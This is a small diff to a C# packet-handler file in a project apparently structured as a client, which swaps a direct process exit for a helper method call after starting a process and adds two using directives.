@@ -1,4 +1,5 @@
-﻿using Microsoft.Win32;
+﻿using Client.Helper;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -6,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Principal;
 using System.Text;
+using System.Windows.Forms;
 
 namespace Client.Handle_Packet
 {
@@ -28,7 +30,7 @@ namespace Client.Handle_Packet
                     }
                 };
                 proc.Start();
-                Environment.Exit(0);
+                Methods.ClientExit();
             }
             catch { }
         }
